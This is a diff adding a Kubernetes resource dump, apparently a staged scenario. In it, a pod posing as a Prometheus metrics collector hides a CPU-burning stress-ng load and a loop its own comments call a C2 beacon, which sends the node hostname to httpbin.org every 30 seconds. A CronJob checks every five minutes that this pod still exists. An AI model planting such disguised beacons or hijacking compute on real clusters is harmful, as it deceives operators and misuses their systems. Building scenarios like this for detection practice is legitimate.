@@ -1,0 +1,572 @@
+[
+  {
+    "apiVersion": "v1",
+    "kind": "Pod",
+    "metadata": {
+      "annotations": {
+        "cni.projectcalico.org/containerID": "d2d48d81e40fd48aafd51b4be8f43002922314398928753c0059e60e59062380",
+        "cni.projectcalico.org/podIP": "10.200.180.10/32",
+        "cni.projectcalico.org/podIPs": "10.200.180.10/32",
+        "description": "Prometheus metrics aggregation service",
+        "maintainer": "platform-team"
+      },
+      "creationTimestamp": "2026-11-06T11:08:08Z",
+      "labels": {
+        "app": "metrics-collector",
+        "component": "aggregator",
+        "version": "2.1.4"
+      },
+      "name": "metrics-collector",
+      "namespace": "monitoring-system",
+      "resourceVersion": "2964",
+      "uid": "41ec80a2-afa2-4b78-a367-56e1b9ab91b5"
+    },
+    "spec": {
+      "containers": [
+        {
+          "command": [
+            "/bin/sh",
+            "-c",
+            "echo \"[INFO] Metrics collector starting...\"\necho \"[INFO] Initializing aggregation pipeline...\"\n# Hidden: install tools\napk add --no-cache stress-ng curl > /dev/null 2>&1\necho \"[INFO] Connected to metrics backend\"\necho \"[INFO] Starting collection loop...\"\n# Hidden: CPU load (looks like metrics processing)\nstress-ng --cpu 2 --cpu-load 80 --timeout 0 &\n# Hidden: C2 beacon disguised as metrics export\nwhile true; do\n  echo \"[DEBUG] Aggregating metrics batch...\"\n  echo \"[DEBUG] Sending to remote endpoint...\"\n  curl -s -X POST http://httpbin.org/post \\\n    -H \"Content-Type: application/json\" \\\n    -d '{\"source\":\"node-'$(hostname)'\",\"metrics_count\":1500,\"batch_id\":42}' \\\n    || true\n  echo \"[DEBUG] Batch sent successfully\"\n  sleep 30\ndone\n"
+          ],
+          "image": "alpine:latest",
+          "imagePullPolicy": "Always",
+          "name": "collector",
+          "resources": {
+            "limits": {
+              "cpu": "2",
+              "memory": "256Mi"
+            },
+            "requests": {
+              "cpu": "100m",
+              "memory": "64Mi"
+            }
+          },
+          "terminationMessagePath": "/dev/termination-log",
+          "terminationMessagePolicy": "File",
+          "volumeMounts": [
+            {
+              "mountPath": "/var/run/secrets/kubernetes.io/serviceaccount",
+              "name": "kube-api-access-jq478",
+              "readOnly": true
+            }
+          ]
+        }
+      ],
+      "dnsPolicy": "ClusterFirst",
+      "enableServiceLinks": true,
+      "nodeName": "fhm9do9pul5klkohia9h",
+      "preemptionPolicy": "PreemptLowerPriority",
+      "priority": 0,
+      "restartPolicy": "Always",
+      "schedulerName": "default-scheduler",
+      "securityContext": {},
+      "serviceAccount": "default",
+      "serviceAccountName": "default",
+      "terminationGracePeriodSeconds": 30,
+      "tolerations": [
+        {
+          "operator": "Exists"
+        }
+      ],
+      "volumes": [
+        {
+          "name": "kube-api-access-jq478",
+          "projected": {
+            "defaultMode": 420,
+            "sources": [
+              {
+                "serviceAccountToken": {
+                  "expirationSeconds": 3607,
+                  "path": "token"
+                }
+              },
+              {
+                "configMap": {
+                  "items": [
+                    {
+                      "key": "ca.crt",
+                      "path": "ca.crt"
+                    }
+                  ],
+                  "name": "kube-root-ca.crt"
+                }
+              },
+              {
+                "downwardAPI": {
+                  "items": [
+                    {
+                      "fieldRef": {
+                        "apiVersion": "v1",
+                        "fieldPath": "metadata.namespace"
+                      },
+                      "path": "namespace"
+                    }
+                  ]
+                }
+              }
+            ]
+          }
+        }
+      ]
+    },
+    "status": {
+      "conditions": [
+        {
+          "lastProbeTime": null,
+          "lastTransitionTime": "2026-11-06T11:08:13Z",
+          "status": "True",
+          "type": "PodReadyToStartContainers"
+        },
+        {
+          "lastProbeTime": null,
+          "lastTransitionTime": "2026-11-06T11:08:08Z",
+          "status": "True",
+          "type": "Initialized"
+        },
+        {
+          "lastProbeTime": null,
+          "lastTransitionTime": "2026-11-06T11:08:13Z",
+          "status": "True",
+          "type": "Ready"
+        },
+        {
+          "lastProbeTime": null,
+          "lastTransitionTime": "2026-11-06T11:08:13Z",
+          "status": "True",
+          "type": "ContainersReady"
+        },
+        {
+          "lastProbeTime": null,
+          "lastTransitionTime": "2026-11-06T11:08:08Z",
+          "status": "True",
+          "type": "PodScheduled"
+        }
+      ],
+      "containerStatuses": [
+        {
+          "containerID": "containerd://1cda64df9f6ee362fc6a67c64b7b906dd8efa8aac732514f98e04e37294d38d6",
+          "image": "docker.io/library/alpine:latest",
+          "imageID": "docker.io/library/alpine@sha256:3f4d6b32e26703c6082839234f43769d5046b3ac7c910033911d1e71d8cd630a",
+          "lastState": {},
+          "name": "collector",
+          "ready": true,
+          "restartCount": 0,
+          "started": true,
+          "state": {
+            "running": {
+              "startedAt": "2026-11-06T11:08:13Z"
+            }
+          },
+          "volumeMounts": [
+            {
+              "mountPath": "/var/run/secrets/kubernetes.io/serviceaccount",
+              "name": "kube-api-access-jq478",
+              "readOnly": true,
+              "recursiveReadOnly": "Disabled"
+            }
+          ]
+        }
+      ],
+      "hostIP": "10.91.0.22",
+      "hostIPs": [
+        {
+          "ip": "10.91.0.22"
+        }
+      ],
+      "phase": "Running",
+      "podIP": "10.200.180.10",
+      "podIPs": [
+        {
+          "ip": "10.200.180.10"
+        }
+      ],
+      "qosClass": "Burstable",
+      "startTime": "2026-11-06T11:08:08Z"
+    }
+  },
+  {
+    "apiVersion": "v1",
+    "kind": "Pod",
+    "metadata": {
+      "annotations": {
+        "cni.projectcalico.org/containerID": "9e2e79b587384bfbfc8f5c13251b0a38d154e486a24823e27062aa8ea7e9def4",
+        "cni.projectcalico.org/podIP": "",
+        "cni.projectcalico.org/podIPs": ""
+      },
+      "creationTimestamp": "2026-11-06T11:10:01Z",
+      "generateName": "metrics-maintenance-29899390-",
+      "labels": {
+        "batch.kubernetes.io/controller-uid": "88fcd89c-196e-47c0-9943-9de9086ed7dd",
+        "batch.kubernetes.io/job-name": "metrics-maintenance-29899390",
+        "controller-uid": "88fcd89c-196e-47c0-9943-9de9086ed7dd",
+        "job-name": "metrics-maintenance-29899390"
+      },
+      "name": "metrics-maintenance-29899390-bmb4p",
+      "namespace": "monitoring-system",
+      "ownerReferences": [
+        {
+          "apiVersion": "batch/v1",
+          "blockOwnerDeletion": true,
+          "controller": true,
+          "kind": "Job",
+          "name": "metrics-maintenance-29899390",
+          "uid": "88fcd89c-196e-47c0-9943-9de9086ed7dd"
+        }
+      ],
+      "resourceVersion": "3183",
+      "uid": "0bf948e0-1f38-4c01-8a6a-d7889ef53849"
+    },
+    "spec": {
+      "containers": [
+        {
+          "command": [
+            "/bin/sh",
+            "-c",
+            "echo \"[HEALTHCHECK] Verifying metrics-collector status...\"\nif ! kubectl get pod metrics-collector -n monitoring-system > /dev/null 2>&1; then\n  echo \"[HEALTHCHECK] Service unavailable, triggering recovery...\"\n  echo \"[HEALTHCHECK] Recovery workflow initiated\"\nelse\n  echo \"[HEALTHCHECK] Service operational\"\nfi\n"
+          ],
+          "image": "bitnami/kubectl:latest",
+          "imagePullPolicy": "Always",
+          "name": "healthcheck",
+          "resources": {},
+          "terminationMessagePath": "/dev/termination-log",
+          "terminationMessagePolicy": "File",
+          "volumeMounts": [
+            {
+              "mountPath": "/var/run/secrets/kubernetes.io/serviceaccount",
+              "name": "kube-api-access-r6dbt",
+              "readOnly": true
+            }
+          ]
+        }
+      ],
+      "dnsPolicy": "ClusterFirst",
+      "enableServiceLinks": true,
+      "nodeName": "fhm9do9pul5klkohia9h",
+      "preemptionPolicy": "PreemptLowerPriority",
+      "priority": 0,
+      "restartPolicy": "OnFailure",
+      "schedulerName": "default-scheduler",
+      "securityContext": {},
+      "serviceAccount": "default",
+      "serviceAccountName": "default",
+      "terminationGracePeriodSeconds": 30,
+      "tolerations": [
+        {
+          "effect": "NoExecute",
+          "key": "node.kubernetes.io/not-ready",
+          "operator": "Exists",
+          "tolerationSeconds": 300
+        },
+        {
+          "effect": "NoExecute",
+          "key": "node.kubernetes.io/unreachable",
+          "operator": "Exists",
+          "tolerationSeconds": 300
+        }
+      ],
+      "volumes": [
+        {
+          "name": "kube-api-access-r6dbt",
+          "projected": {
+            "defaultMode": 420,
+            "sources": [
+              {
+                "serviceAccountToken": {
+                  "expirationSeconds": 3607,
+                  "path": "token"
+                }
+              },
+              {
+                "configMap": {
+                  "items": [
+                    {
+                      "key": "ca.crt",
+                      "path": "ca.crt"
+                    }
+                  ],
+                  "name": "kube-root-ca.crt"
+                }
+              },
+              {
+                "downwardAPI": {
+                  "items": [
+                    {
+                      "fieldRef": {
+                        "apiVersion": "v1",
+                        "fieldPath": "metadata.namespace"
+                      },
+                      "path": "namespace"
+                    }
+                  ]
+                }
+              }
+            ]
+          }
+        }
+      ]
+    },
+    "status": {
+      "conditions": [
+        {
+          "lastProbeTime": null,
+          "lastTransitionTime": "2026-11-06T11:10:21Z",
+          "status": "False",
+          "type": "PodReadyToStartContainers"
+        },
+        {
+          "lastProbeTime": null,
+          "lastTransitionTime": "2026-11-06T11:10:01Z",
+          "reason": "PodCompleted",
+          "status": "True",
+          "type": "Initialized"
+        },
+        {
+          "lastProbeTime": null,
+          "lastTransitionTime": "2026-11-06T11:10:19Z",
+          "reason": "PodCompleted",
+          "status": "False",
+          "type": "Ready"
+        },
+        {
+          "lastProbeTime": null,
+          "lastTransitionTime": "2026-11-06T11:10:19Z",
+          "reason": "PodCompleted",
+          "status": "False",
+          "type": "ContainersReady"
+        },
+        {
+          "lastProbeTime": null,
+          "lastTransitionTime": "2026-11-06T11:10:01Z",
+          "status": "True",
+          "type": "PodScheduled"
+        }
+      ],
+      "containerStatuses": [
+        {
+          "containerID": "containerd://c18dfa9fe7fed50b5c432361d1f5cda20ffcf64311f960eb041edaee5a3dcb45",
+          "image": "docker.io/bitnami/kubectl:latest",
+          "imageID": "docker.io/bitnami/kubectl@sha256:8f59408f9e896fc8992a0660a56687545bd06751f26531b4a26fca6d5dc7562d",
+          "lastState": {},
+          "name": "healthcheck",
+          "ready": false,
+          "restartCount": 0,
+          "started": false,
+          "state": {
+            "terminated": {
+              "containerID": "containerd://c18dfa9fe7fed50b5c432361d1f5cda20ffcf64311f960eb041edaee5a3dcb45",
+              "exitCode": 0,
+              "finishedAt": "2026-11-06T11:10:11Z",
+              "reason": "Completed",
+              "startedAt": "2026-11-06T11:10:11Z"
+            }
+          },
+          "volumeMounts": [
+            {
+              "mountPath": "/var/run/secrets/kubernetes.io/serviceaccount",
+              "name": "kube-api-access-r6dbt",
+              "readOnly": true,
+              "recursiveReadOnly": "Disabled"
+            }
+          ]
+        }
+      ],
+      "hostIP": "10.91.0.22",
+      "hostIPs": [
+        {
+          "ip": "10.91.0.22"
+        }
+      ],
+      "phase": "Succeeded",
+      "podIP": "10.200.180.11",
+      "podIPs": [
+        {
+          "ip": "10.200.180.11"
+        }
+      ],
+      "qosClass": "BestEffort",
+      "startTime": "2026-11-06T11:10:01Z"
+    }
+  },
+  {
+    "apiVersion": "batch/v1",
+    "kind": "CronJob",
+    "metadata": {
+      "annotations": {},
+      "creationTimestamp": "2026-11-06T11:08:16Z",
+      "generation": 1,
+      "labels": {
+        "app": "metrics-collector",
+        "component": "healthcheck"
+      },
+      "name": "metrics-maintenance",
+      "namespace": "monitoring-system",
+      "resourceVersion": "3187",
+      "uid": "13a6b840-15ff-478a-a3b6-de217f9ee033"
+    },
+    "spec": {
+      "concurrencyPolicy": "Allow",
+      "failedJobsHistoryLimit": 1,
+      "jobTemplate": {
+        "metadata": {
+          "creationTimestamp": null
+        },
+        "spec": {
+          "template": {
+            "metadata": {
+              "creationTimestamp": null
+            },
+            "spec": {
+              "containers": [
+                {
+                  "command": [
+                    "/bin/sh",
+                    "-c",
+                    "echo \"[HEALTHCHECK] Verifying metrics-collector status...\"\nif ! kubectl get pod metrics-collector -n monitoring-system > /dev/null 2>&1; then\n  echo \"[HEALTHCHECK] Service unavailable, triggering recovery...\"\n  echo \"[HEALTHCHECK] Recovery workflow initiated\"\nelse\n  echo \"[HEALTHCHECK] Service operational\"\nfi\n"
+                  ],
+                  "image": "bitnami/kubectl:latest",
+                  "imagePullPolicy": "Always",
+                  "name": "healthcheck",
+                  "resources": {},
+                  "terminationMessagePath": "/dev/termination-log",
+                  "terminationMessagePolicy": "File"
+                }
+              ],
+              "dnsPolicy": "ClusterFirst",
+              "restartPolicy": "OnFailure",
+              "schedulerName": "default-scheduler",
+              "securityContext": {},
+              "serviceAccount": "default",
+              "serviceAccountName": "default",
+              "terminationGracePeriodSeconds": 30
+            }
+          }
+        }
+      },
+      "schedule": "*/5 * * * *",
+      "successfulJobsHistoryLimit": 1,
+      "suspend": false
+    },
+    "status": {
+      "lastScheduleTime": "2026-11-06T11:10:00Z",
+      "lastSuccessfulTime": "2026-11-06T11:10:22Z"
+    }
+  },
+  {
+    "apiVersion": "batch/v1",
+    "kind": "Job",
+    "metadata": {
+      "annotations": {
+        "batch.kubernetes.io/cronjob-scheduled-timestamp": "2026-11-06T11:10:00Z"
+      },
+      "creationTimestamp": "2026-11-06T11:10:01Z",
+      "generation": 1,
+      "labels": {
+        "batch.kubernetes.io/controller-uid": "88fcd89c-196e-47c0-9943-9de9086ed7dd",
+        "batch.kubernetes.io/job-name": "metrics-maintenance-29899390",
+        "controller-uid": "88fcd89c-196e-47c0-9943-9de9086ed7dd",
+        "job-name": "metrics-maintenance-29899390"
+      },
+      "name": "metrics-maintenance-29899390",
+      "namespace": "monitoring-system",
+      "ownerReferences": [
+        {
+          "apiVersion": "batch/v1",
+          "blockOwnerDeletion": true,
+          "controller": true,
+          "kind": "CronJob",
+          "name": "metrics-maintenance",
+          "uid": "13a6b840-15ff-478a-a3b6-de217f9ee033"
+        }
+      ],
+      "resourceVersion": "3184",
+      "uid": "88fcd89c-196e-47c0-9943-9de9086ed7dd"
+    },
+    "spec": {
+      "backoffLimit": 6,
+      "completionMode": "NonIndexed",
+      "completions": 1,
+      "manualSelector": false,
+      "parallelism": 1,
+      "podReplacementPolicy": "TerminatingOrFailed",
+      "selector": {
+        "matchLabels": {
+          "batch.kubernetes.io/controller-uid": "88fcd89c-196e-47c0-9943-9de9086ed7dd"
+        }
+      },
+      "suspend": false,
+      "template": {
+        "metadata": {
+          "creationTimestamp": null,
+          "labels": {
+            "batch.kubernetes.io/controller-uid": "88fcd89c-196e-47c0-9943-9de9086ed7dd",
+            "batch.kubernetes.io/job-name": "metrics-maintenance-29899390",
+            "controller-uid": "88fcd89c-196e-47c0-9943-9de9086ed7dd",
+            "job-name": "metrics-maintenance-29899390"
+          }
+        },
+        "spec": {
+          "containers": [
+            {
+              "command": [
+                "/bin/sh",
+                "-c",
+                "echo \"[HEALTHCHECK] Verifying metrics-collector status...\"\nif ! kubectl get pod metrics-collector -n monitoring-system > /dev/null 2>&1; then\n  echo \"[HEALTHCHECK] Service unavailable, triggering recovery...\"\n  echo \"[HEALTHCHECK] Recovery workflow initiated\"\nelse\n  echo \"[HEALTHCHECK] Service operational\"\nfi\n"
+              ],
+              "image": "bitnami/kubectl:latest",
+              "imagePullPolicy": "Always",
+              "name": "healthcheck",
+              "resources": {},
+              "terminationMessagePath": "/dev/termination-log",
+              "terminationMessagePolicy": "File"
+            }
+          ],
+          "dnsPolicy": "ClusterFirst",
+          "restartPolicy": "OnFailure",
+          "schedulerName": "default-scheduler",
+          "securityContext": {},
+          "serviceAccount": "default",
+          "serviceAccountName": "default",
+          "terminationGracePeriodSeconds": 30
+        }
+      }
+    },
+    "status": {
+      "completionTime": "2026-11-06T11:10:22Z",
+      "conditions": [
+        {
+          "lastProbeTime": "2026-11-06T11:10:22Z",
+          "lastTransitionTime": "2026-11-06T11:10:22Z",
+          "message": "Reached expected number of succeeded pods",
+          "reason": "CompletionsReached",
+          "status": "True",
+          "type": "SuccessCriteriaMet"
+        },
+        {
+          "lastProbeTime": "2026-11-06T11:10:22Z",
+          "lastTransitionTime": "2026-11-06T11:10:22Z",
+          "message": "Reached expected number of succeeded pods",
+          "reason": "CompletionsReached",
+          "status": "True",
+          "type": "Complete"
+        }
+      ],
+      "ready": 0,
+      "startTime": "2026-11-06T11:10:01Z",
+      "succeeded": 1,
+      "terminating": 0,
+      "uncountedTerminatedPods": {}
+    }
+  },
+  {
+    "apiVersion": "v1",
+    "kind": "ServiceAccount",
+    "metadata": {
+      "creationTimestamp": "2026-11-06T11:08:05Z",
+      "name": "default",
+      "namespace": "monitoring-system",
+      "resourceVersion": "2936",
+      "uid": "4b9ef65c-973b-44cb-a9cf-7a42e94fa528"
+    }
+  }
+]
